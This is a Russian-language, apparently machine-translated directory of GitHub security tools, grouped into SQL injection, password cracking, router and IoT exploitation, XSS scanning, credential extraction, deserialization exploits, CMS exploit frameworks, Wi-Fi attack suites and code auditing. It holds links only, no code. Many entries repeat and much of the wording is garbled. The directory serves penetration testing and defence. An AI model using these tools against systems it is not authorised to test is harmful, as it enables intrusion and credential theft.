- https://github.com/NetSPI/PowerUpSQL (среда сценариев Powershell, которая атакует SQLSERVER)
- https://github.com/WhitewidowScanner/whitewidow (сканер базы данных)
- https://github.com/ штамповка / монгоаудит(Инструмент аудита и проникновения MongoDB)
- https://github.com/torque59/Nosql-Exploitation-Framework ( инструмент для сканирования / обработки NoSQL)
- https://github.com/missDronio/blindy (инструмент для слепой струйной обработки MySQL)
- https://github.com/fengxuangit/Fox-scan (инструмент сканирования уязвимостей для обнаружения активных и пассивных ресурсов на основе SQLMAP)
- https://github.com/NetSPI/PowerUpSQL (сценарий powershell для аудита SQL Server)
- https://github.com / JohnTroony / Blisqy ( инструмент для слепой инъекции в заголовке http, только для MySQL / MariaDB)
- https://github.com/ron190/jsql-injection (инструмент для инъекции SQL, написанный на Java)
- https://github.com/Hadesy2k/sqliv (сканер уязвимостей для массовых инъекций SQL на основе поисковой системы)
- https://github.com/UltimateHackers/sqlmate (добавлено сканирование каталогов, удаление хеш-файлов и другие функции на основе sqlmap)
слабый пароль / слабый Сканер имени пользователя или инструмент для взрывных работ
- https://github.com/lijiejie/htpwdScan(Простое http-взлома, сценарий атаки библиотечного столкновения)
- https://github.com/ysrc/F-Scrack ( скрипт для обнаружения слабых паролей различных служб)
- https://github.com/Mebus/cupp (Создать скрипт словаря для обнаружения слабых паролей в соответствии с привычками пользователя)
- https://github.com/netxfly/crack_ssh (сопрограммная версия инструмента взлома слабых паролей ssh ​​\ redis \ mongodb, написанного Go)
- https://github.com/LandGrey/ pydictor (инструмент создания словаря взлома)
- https://github.com/shengqi158/weak_password_detect (обнаружение слабого пароля в многопоточном режиме)
- https://github.com/UltimateHackers/Blazy (поддерживает тестирование слабых паролей для CSRF, Clickjacking, Cloudflare и WAF Зонд)
Средство идентификации IoT-устройства или сканер
- https://github.com/reverse-shell/routersploit (структура эксплойта маршрутизатора)
- https://github.com/jh00nbr/Routerhunter-2.0 (сканирование эксплойта маршрутизатора)
- https://github.com/RUB-NDS/PRET ( инфраструктура атаки на принтер)
- https://github.com/rapid7/IoTSeeker ( по умолчанию пароль вещи устройство Scan Tool)
- https://github.com/shodan-labs/iotdb (IoT с помощью Nmap сканирующего устройства)
- https://github.com/googleinurl / RouterHunterBR (сканирование и использование уязвимостей устройства маршрутизатора)
- https://github.com/scu-igroup/telnet-scanner (библиотека столкновения паролей службы Telnet)
отражающий или XSS-сканер на основе DOM
- https://github.com/shawarkhanethicalhacker/ BruteXSS (XSS-сканер с параметрами впрыска грубой силы)
- https://github.com/1N3/XSSTracer (небольшой XSS-сканер, который также может обнаруживать CRLF, XSS, перехваты кликов)
- https://github.com/0x584A / fuzzXssPHP (PHP-версия отражающего сканирования xss)
- https://github.com/chuhades/xss_scan (сценарий python для пакетного сканирования XSS)
- https://github.com/BlackHole1/autoFindXssAndCsrf (автоматическое обнаружение существования XSS и CSRF Уязвимый плагин для браузера)
- https://github.com/shogunlab/shuriken (обнаружение пакетов XSS с помощью командной строки)
- https://github.com/UltimateHackers/XSStrike (средство сканирования XSS, которое может определять и обходить WAF)
- https://github.com / stamparm / DSXS (эффективный сканер XSS, поддерживающий GET и POST). Средство
управления активами предприятия или сбора утечки информации
- https://github.com/ysrc/xunfeng (механизм распознавания сетевых активов, механизм обнаружения уязвимостей)
- https://github.com / laramies / theHarvester (предприятия включены в скрипты мониторинга поисковых систем для получения конфиденциальной информации об активах: почтовый ящик сотрудника, поддомен, хосты)
- https://github.com/x0day/Multisearch-v2 (Bing, google, 360, zoomeye и другие поисковые системы Агрегированный поиск, который можно использовать для поиска конфиденциальной информации об активах, собранной поисковыми системами)
- https://github.com/Ekultek/Zeus-Scanner (Интегрированная комплексная поисковая система, способная сканировать URL-адреса, скрытые поисковыми системами, и передавать их sqlmap, nmap scan)
- https://github.com/0xbug/Biu-framework (базовая среда сканирования безопасности корпоративной сети предприятия)
- https://github.com/metac0rtex/GitHarvester(инструмент сбора информации github Repo)
- https://github.com/shengqi158/svnhack (инструмент эксплуатации утечки папок .svn)
- https://github.com/repoog/GitPrey (инструмент сканирования конфиденциальной информации GitHub)
- https://github.com/0xbug/Hawkeye (корпоративные активы, система контроля утечки конфиденциальной информации GitHub)
- https://github.com/lianfeng30/githubscan (инструменты для поиска проекта и соответствующего сканирования конфиденциального файла и содержимого файлов по ключевым словам предприятия)
- https://github.com/UnkL4b/GitMiner (инструмент поиска конфиденциальной информации github)
- https://github.com/lijiejie/GitHack (инструмент эксплуатации утечки папок .git)
- https://github.com/dxa4481/truffleHog (конфиденциальная информация GitHub) Инструменты сканирования, включая обнаружение фиксаций и т. Д.)
Https://github.com/sowish/LNScan (сканер подробной внутренней информации о сети)
- https://github.com/SkyLined/LocalNetworkScanner (сканер локальной сети, реализованный на JavaScript)
- https://github.com/x0day/Multisearch-v2(Совокупный поиск в поисковых системах можно использовать для обнаружения конфиденциальной информации об активах, включенной в поисковые системы).
Инструмент обнаружения веб-оболочек или анализа вирусов
- https://github.com/ym2011/ScanBackdoor (простой инструмент сканирования веб-оболочек)
- https://github.com/yassineaddi/BackdoorMan (обнаружение php веб-оболочки для указанного каталога)
- https://github.com/he1m4n6a/findWebshell (простой инструмент обнаружения веб-оболочек)
- https://github.com/Tencent/HaboMalHunter (Hubble Система анализа, анализ вирусов в системе Linux и обнаружение безопасности)
- https://github.com/PlagueScanner/PlagueScanner (антивирусное ядро, интегрированное с ClamAV, ESET, Bitdefender с использованием Python)
- https://github.com/nbs-system/ php-malware-finder (эффективный инструмент сканирования PHP-веб-оболочек)
- https://github.com/emposha/PHP-Shell-Detector/ (инструмент обнаружения веб-оболочек с эффективностью тестирования до 99%)
- https://github.com / erevus-cn / scan_webshell (простой инструмент сканирования Webshell)
- https://github.com/emposha/Shell-Detector (инструмент сканирования Webshell, поддерживает сканирование php / perl / asp / aspx webshell)
- https://github.com/m4rco-/dorothy2 (троянец, среда анализа ботнетов )
Инструмент для проникновения в интрасеть или сканирования
- https://github.com/0xwindows/VulScritp (сценарий проникновения в корпоративную интрасеть, включая сканирование баннеров, сканирование портов; phpmyadmin, jenkins и т. Д. Использование общих уязвимостей и т. Д.)
Https://github.com/lcatro / network_backdoor_scanner (инфраструктура обнаружения в интрасети, основанная на сетевом трафике)
- https://github.com/fdiskyou/hunter (вызвать Windows API для перечисления информации для входа пользователя)
- https://github.com/BlackHole1/WebRtcXSS (автоматически использовать XSS для вторжения Интернет)
- https://github.com/0xwindows/VulScritp (сценарий проникновения в корпоративную интрасеть, включая сканирование баннеров, сканирование портов; различные общие действия и т. Д.)
Https://github.com/fdiskyou/hunter (вызов API-интерфейсов Windows ) Введите информацию для входа в систему пользователя)
- https://github.com/AlessandroZ/LaZagne(Средство извлечения локального представления пароля)
- https://github.com/huntergregal/mimipenguin (артефакт захвата пароля linux)
сканер промежуточного программного обеспечения или средство идентификации
- https://nmap.org/download.html (сканер портов Nmap) Wang, -https : //svn.nmap.org/ )
- https://github.com/ring04h/wyportmap (сканирование целевого порта + распознавание отпечатков пальцев системной службы)
- https://github.com/ring04h/weakfilescan (динамическая многопоточность) Инструмент обнаружения утечки конфиденциальной информации)
- https://github.com/EnableSecurity/wafw00f (распознавание отпечатков пальцев продукта WAF)
- https://github.com/rbsec/sslscan (распознавание типа ssl)
- https://github.com/urbanadventurer/whatweb (распознавание отпечатков пальцев в Интернете)
- https://github.com/tanjiti/FingerPrint (распознавание отпечатков пальцев в веб-приложениях)
- https://github.com/nanshihui/Scan-T (распознавание отпечатков пальцев в веб-сканере)
- https://github.com/ OffensivePython / Nscan(быстрый сетевой сканер, созданный на основе Masscan и Zmap)
- https://github.com/ywolf/F-NAScan (сканирование информации о сетевых ресурсах , обнаружение выживания ICMP, сканирование портов, идентификация службы идентификации отпечатков портов)
- https://github.com/ ywolf / F-MiddlewareScan (сканирование промежуточного программного обеспечения)
- https://github.com/maurosoria/dirsearch (сканер веб-пути)
- https://github.com/x0day/bannerscan (сканирование баннера и пути сегмента C)
- https://github.com / RASSec / RASscan (сканирование службы портов)
- https://github.com/3xp10it/bypass_waf (автоматический всплеск waf )
- https://github.com/3xp10it/xcdn (попытайтесь выяснить реальный ip за cdn )
- https://github.com/Xyntax/BingC (поисковая система B-сегмента, основанная на запросе сегмента C / боковой станции, многопоточность, поддержка API)
- https://github.com/Xyntax/DirBrute (инструмент многопоточной обработки веб-каталогов)
- https://github.com/zer0h/-httpscan (гаджет обнаружения веб-хоста в стиле искателя)
- https://github.com/lietdai/doom (сканер уязвимостей IP-портов для распределенного распределения задач, реализованный на thorn)
- https://github.com/ chichou / grab.js (инструмент для быстрого анализа отпечатков пальцев TCP, похожий на zgrab, поддерживает больше протоколов)
- https://github.com/Nitr4x/whichCDN (распознавание CDN, обнаружение)
- https://github.com/secfree/bcrpscan (Сканер веб-путей на основе искателя)
- https://github.com/ring04h/wyportmap (сканирование целевого порта + распознавание отпечатков пальцев системной службы)
- https://github.com/rbsec/sslscan (распознавание типа SSL)
- https://github.com/urbanadventurer/whatweb (распознавание отпечатков пальцев в Интернете)
- https://github.com/tanjiti/FingerPrint (распознавание отпечатков пальцев в веб-приложениях)
- https://github.com/OffensivePython/Nscan (сетевой сканер на основе Masscan и Zmap)
- https://github.com/maurosoria/dirsearch (сбор и сканирование веб-путей)
- https://github.com/3xp10it/xcdn (попытайтесь выяснить реальный IP-адрес позади cdn)
- https://github.com/lietdai/doom (сканер уязвимостей IP-портов для распределения распределенных задач, реализованный в Thorn)
- https://github.com/mozilla/ssh_scan (сканирование информации о конфигурации сервера ssh)
- https://github.com/18F/domain-scan (обнаружение / сканирование данных активов для доменных имен и поддоменов, включая обнаружение-http / -https И т. Д.)
Https://github.com/ggusoft/inforfinder (инструмент для сбора активов доменных имен и распознавания отпечатков пальцев)
- https://github.com/boy-hack/gwhatweb (реализация Python Gevent для распознавания CMS)
- https://github.com/ Mosuan / FileScan (сканирование конфиденциальных файлов / вторичное суждение для снижения частоты ложных срабатываний / регуляризация содержимого сканирования / сканирование нескольких каталогов)
- https://github.com/Xyntax/FileSensor (средство обнаружения динамических чувствительных файлов на основе сканера )
- https://github.com/deibit/cansina (средство сканирования веб-путей)
- https://github.com/0xbug/Howl (сканирование и поиск отпечатков пальцев веб-службы сетевого устройства)
- https://github.com/mozilla/cipherscan (распознавание типа ssl целевого хост-сервиса)
- https://github.com/xmendez/wfuzz (инструмент для создания веб-приложений, инфраструктура, а также может использоваться для сканирования веб-путей / сервисов)
- https://github.com/UltimateHackers/Breacher (многопоточный фоновый сканер путей, также можно использовать для поиска уязвимостей Execution After Redirect)
- https://github.com/ztgrace/changeme (сканер слабых паролей, не только поддерживает обычные страницы входа, но и Поддерживает ssh, mongodb и другие компоненты)
- https://github.com/medbenali/CyberScan (вспомогательный инструмент тестирования на проникновение, поддерживает анализ пакетов данных, декодирование, сканирование портов, анализ IP-адресов и т. Д.)
Https://github.com/m0nad/HellRaiser (Сканер на основе Nmap, связанный с уязвимостью cve)
- https://github.com/scipag/vulscan (расширенный сканер уязвимостей на основе nmap, используемый в среде командной строки)
- https://github.com/jekyc/wig (web) Инструмент сбора информации о приложении)
- https://github.com/eldraco/domain_analyzer (сбор информации и «передача домена» вокруг доменного имени веб-службы сканируются на наличие уязвимостей и поддержки сканирования портов сервера и т. Д.)
- https://github.com/cloudtracer/paskto (сканирование пассивного пути и поиск информации на основе правил сканирования Nikto)
- https://github.com/zerokeeper/WebEye (быстрая идентификация типа веб-сервера, типа CMS, типа WAF, информации WHOIS И языковая структура)
- https://github.com/m3liot/shcheck (для проверки безопасности заголовка веб-службы-http)
- https://github.com/aipengjie/sensitivefilescan (эффективное и быстрое сканирование конфиденциальных файлов). Инструменты)
- https://github.com/fnk0c/cangibrina (кроссплатформенный сканер путей фонового управления через исчерпание словаря, google, robots.txt и т. Д.)
Https://github.com/n4xh4ck5/CMSsc4n (распознавание отпечатков пальцев CMS) )
Выделенный (то есть специфический для определенных компонентов) сканер
- https://github.com/brianwrf/hackUtils (набор инструментов для использования десериализации Java)
- https://github.com/frohoff/ysoserial (использование десериализации Java) Инструменты)
- https://github.com/blackye/Jenkins (обнаружение уязвимостей Jenkins, сканирование и удаление пользователей)
- https://github.com/code-scan/dzscan (поиск уязвимостей discuz)
- https://github.com/chuhades/CMS-Exploit-Framework (среда атаки CMS)
- https://github.com/lijiejie/IIS_shortname_Scanner ( Уязвимость сканирования коротких имен файлов IIS)
- https://github.com/riusksk/FlashScanner (сканирование flashxss)
- https://github.com/coffeehb/SSTIF (полуавтоматический инструмент для уязвимости, связанной с внедрением шаблонов на стороне сервера)
- https://github.com/epinna/tplmap (инструмент обнаружения и эксплуатации уязвимостей при внедрении шаблонов на стороне сервера)
- https://github.com/cr0hn/dockerscan (средство сканирования докеров)
- https://github.com/GoSecure/break-fast-serial (с DNS Анализ для обнаружения инструмента уязвимости десериализации Java)
- https://github.com/dirtycow/dirtycow.github.io (exp-уязвимость повышения привилегий коровьей модели)
- https://github.com/code-scan/dzscan (первая интеграция Discuz сканирующий инструмент)
- https://github.com/chuhades/CMS-Exploit-Framework (простая и элегантная среда сканирования и использования CMS)
- https://github.com/lijiejie/IIS_shortname_Scanner (инструмент для использования уязвимости перебора имен с помощью грубой силы в IIS)
- https://github.com/coffeehb/SSTIF (полуавтоматический инструмент для выявления уязвимостей при внедрении шаблонов на стороне сервера)
- https://github.com/cr0hn/dockerscan (средство сканирования Docker)
- https://github.com/m4ll0k/WPSeku (Упрощенный инструмент для сканирования WordPress)
- https://github.com/rastating/wordpress-exploit-framework (интегрированная среда эксплойтов WordPress)
- https://github.com/ilmila/J2EEScan (используется для сканирования приложений J2EE Плагин burpsuite)
- https://github.com/riusksk/StrutScan (сканер исторических уязвимостей strut2 на основе Perl)
- https://github.com/D35m0nd142/LFISuite (локальные файлы включают инструменты для эксплуатации уязвимостей и сканирования, (Поддержка отскок оболочки)
- https://github.com/0x4D31/salt-scanner (сканер уязвимостей Linux на основе Salt Open и API аудита Vulners Linux, поддерживает использование с JIRA, слабые платформы)
- https://github.com/tijme/angularjs-csti -scanner ( средство обнаружения уязвимостей при внедрении шаблонов AngularJS на клиентском компьютере)
- https://github.com/irsdl/IIS-ShortName-Scanner (средство эксплуатации уязвимости перечисления с помощью перебора коротких имен в IIS, написанное на Java)
- https://github.com / swisskyrepo / Wordpresscan (оптимизированная версия сканера WordPress на основе WPScan и WPSeku)
- https://github.com/CHYbeta/cmsPoc (среда тестирования на проникновение CMS)
- https://github.com/rudSarkar/crlf-injector (уязвимость внедрения CRLF) Пакетное сканирование)
- https://github.com/3gstudent/Smbtouch-Scanner (Автоматическое сканирование серии уязвимостей ETERNAL, просочившихся теневыми брокерами во внутренней сети)
- https://github.com/utiso/dorkbot (через настроенный Google Поисковая система для поиска и сканирования страниц уязвимостей)
- https://github.com/OsandaMalith/LFiFreak (локальный файл содержит инструменты для эксплойтов и сканирования, поддерживает оболочку для восстановления)
- https://github.com/mak-/parameth (поле неизвестного параметра GET / POST, используемое для перечисления скриптов )
- https://github.com/Lucifer1993/struts-scan (struts2 полная версия уязвимости и использовать инструмент обнаружения)
- https://github.com/hahwul/a2sv (сканирование уязвимостей SSL, уязвимости , такие как сердце крови и т.д.)
HTTPS://github.com/NullArray/DorkNet (веб-поиск уязвимостей на основе поисковых систем)
- https://github.com/NickstaDB/BaRMIe (инструмент, используемый для атаки и взрыва службы вызова удаленных методов Java)
- https://github.com/RetireJS / grunt-retire (сканирование на наличие общих уязвимостей в библиотеках расширений js)
- https://github.com/kotobukki/BDA (инструмент обнаружения уязвимостей для платформ больших данных, таких как hadoop / spark)
- https://github.com/jagracey/Regex -DoS ( RegEx сканер отказа в обслуживании)
- https://github.com/milesrichardson/docker-onion-nmap(Используйте nmap для сканирования скрытого «лукового» сервиса в сети Tor)
- https://github.com/Moham3dRiahi/XAttacker (инструмент для эксплойтов Web CMS, включая 66 различных эксплойтов для основной CMS)
- https://github.com/ lijiejie / BBScan (мини-скрипт пакетного сканирования с утечкой информации
) сканер беспроводной сети (аудит)
- https://github.com/savio-code/fern-wifi-cracker/ (инструмент аудита безопасности беспроводной сети )
- https://github. com / m4n3dw0lf / PytheM (инструмент тестирования сетей / проникновения Python)
- https://github.com/P0cL4bs/WiFi-Pumpkin (набор тестов на проникновение беспроводной безопасности)
- https://github.com/MisterBianco/BoopSuite (инструмент аудита беспроводной сети, Поддержка диапазона частот 2-5 ГГц)
- https://github.com/DanMcInerney/LANs.py (спуфинг ARP, угон беспроводной сети)
- https://github.com/besimaltnok/PiFinger (проверьте, открыт ли Wi-Fi «Большим ананасом» Горячая точка, и дайте оценку сети)
- https://github.com/derv82/wifite2(Восстановленная версия автоматизированного инструмента для атаки на беспроводную сеть wifite)
Сканер локальной сети (
- https://github.com/sowish/LNScan) (сканирование локальной сети на основе BBScan via.lijiejie)
- https://github.com/ niloofarkheirkhah / Нили (сканирование по сети, средние атаки, обнаружение протокола и обратный)
- https://github.com/SkyLined/LocalNetworkScanner (JavaScript на основе локальной сети сканирования)
код инструмент аудита или сканер
- https://github.com/wufeifei/ cobra (система аудита безопасности кода белого ящика)
- https://github.com/OneSourceCat/phpvulhunter (аудит статического php-кода)
- https://github.com/Qihoo360/phptrace (инструмент для отслеживания и анализа работы PHP)
- https://github.com/ajinabraham/NodeJsScan (аудит кода приложения NodeJS)
- https://github.com/shengqi158/pyvulhunter (аудит приложения Python)
- https://github.com/presidentbeef/brakeman(Статический анализ кода приложения Ruby on Rails)
- https://github.com/python-security/pyt ( модульный дизайн статического аудита приложения Python)
- https://github.com/m4ll0k/WPSploit (аудит безопасности кода плагина WordPress)
Инфраструктура сканера или обнаружения уязвимостей
- https://github.com/az0ne/AZScanner (автоматический сканер уязвимостей, уничтожение поддоменов, сканирование портов, очистка каталогов, обнаружение уязвимостей общей инфраструктуры)
- https://github.com/blackye/lalascan ( Распределенная среда сканирования веб-уязвимостей, которая объединяет возможности сканирования уязвимостей owasp top10 и возможности обнаружения пограничных активов)
- https://github.com/blackye/BkScanner (BkScanner, подключаемый модуль, сканер веб-уязвимостей)
- https://github.com/ysrc / GourdScanV2 (средство сканирования пассивных уязвимостей, разработанное ysrc)
- https://github.com/netxfly/passive_scan (сканер веб-уязвимостей на основе прокси-http)
- https://github.com/1N3/Sn1per (автоматический сканер, включая (Сканирование промежуточного программного обеспечения и распознавание отпечатков пальцев устройства)
- https://github.com/RASSec/pentestEr_Fully-automatic-scanner(Направленный полностью автоматизированный инструмент тестирования на проникновение)
- https://github.com/3xp10it/3xp10it (среда автоматического тестирования на проникновение, поддержка cdn real ip search, распознавание отпечатков пальцев и т. Д.)
Https://github.com/Lcys/lcyscan (плагин python) Сканер уязвимостей, поддержка создания отчетов о сканировании)
- https://github.com/Xyntax/POC-T (среда параллелизма плагина для тестирования на проникновение)
- https://github.com/v3n0m-Scanner/V3n0M-Scanner (поддержка обнаружения SQLi / XSS / LFI / RFI и другие сканеры уязвимостей)
- https://github.com/Skycrab/leakScan (веб-среда для сканирования уязвимостей в графической среде )
- https://github.com/zhangzhenfeng/AnyScan (автоматизация на основе Интернета) Инфраструктура тестирования на проникновение)
- https://github.com/Tuhinshubhra/RED_HAWK (универсальное средство сканирования, которое объединяет сбор информации, сканирование уязвимостей, распознавание отпечатков пальцев и т. Д.)
Https://github.com/Arachni/arachni (высокоинтегрированный Инфраструктура сканирования уязвимостей веб-приложений, поддерживающая вызовы REST, RPC и другие API)
- https://github.com/infobyte/faraday (интегрированная вспомогательная платформа для тестирования на проникновение и платформа для управления уязвимостями)
- https://github.com/boy-hack/w8scan (сканер, основанный на сканировании bugscan и архитектурных идеях)
- https://github.com/juansacco/exploitpack (интегрированная среда тестирования на проникновение, включающая более 38 000+ эксплойтов)
- https://github.com/swisskyrepo/DamnWebScanner (пассивное сканирование уязвимостей на основе плагина chrome / opera)
- https://github.com/anilbaranyelken/tulpar (поддерживает множественное сканирование веб-уязвимостей, используемое в среде командной строки)
- https://github.com / m4ll0k / Spaghetti (сканер веб-приложений, поддерживает распознавание отпечатков пальцев, удаление папок с файлами, сканирование SQL / XSS / RFI и другие уязвимости, а также может использоваться непосредственно для Struts, ShellShock и другого сканирования)
- https://github.com/Yukinoshita47/ Yuki-Chan-The-Auto-Pentest (сканер веб-приложений со встроенным перечислением поддоменов, nmap, распознаванием отпечатков пальцев и другими модулями)
- https://github.com/0xsauby/yasuo (в сети сканирования, разработанной ruby, существуют хосты) Уязвимость в сторонней службе веб-приложений)
- https://github.com/hatRiot/clusterd (среда сканирования веб-приложений, поддерживает автоматическую загрузку веб-оболочки)
- https://github.com/erevus-cn/pocscan (платформа вызова Poc с открытым исходным кодом, которая может легко вызывать Pocsuite, Tangscan, Beebeeto, старые версии POC Knowsec, может быть развернута с помощью докера)
- https://github.com/TophantTechnology/ osprey (среда обнаружения уязвимостей с открытым исходным кодом, разработанная Центром компетенций Douxiang и поддерживаемая в течение длительного времени)
- https://github.com/yangbh/Hammer (среда сканирования уязвимостей веб-приложений)
- https://github.com/Lucifer1993/AngelSword (сканирование уязвимостей веб-приложений Framework, основанный на python3)
- https://github.com/secrary/EllaScanner (пассивное сканирование уязвимостей, поддержка выявления уязвимостей по историческому номеру Cve)
- https://github.com/zaproxy/zaproxy (всеобъемлющее проникновение в основной проект OWASP ZAP Инструмент тестирования)
- https://github.com/sullo/nikto (встроенный сканер веб-служб, используемый для сбора активов, дефектов конфигурации безопасности или сканирования уязвимостей указанной цели)
- https://github.com/UltimateHackers/Striker ( Многофункциональный инструмент сбора информации, идентификации отпечатков пальцев и поиска уязвимостей)
- https://github.com/dermotblair/webvulscan(Сканер уязвимостей веб-приложений, который поддерживает сканирование рефлексивных и хранилищ xss, sql-инъекций и других уязвимостей и поддерживает вывод отчетов в формате pdf)
- https://github.com/alienwithin/OWASP-mth3l3m3nt-framework (вспомогательный инструмент для тестирования на проникновение, комплексный с использованием рамок)
выдвинутой постоянная угроза (APT) инструменты
- https://github.com/Neo23x0/Loki (APT нашествие метка сканера)
- https://github.com/r00t-3xp10it/FakeImageExploiter ( с помощью прилагаемого изображения бэкдора Инструменты - FakeImageExploiter)
инструменты, связанные с безопасностью промышленного контроля
- https://github.com/w3h/icsmaster/tree/master/nse (скрипт сканирования nmap устройства ICS)
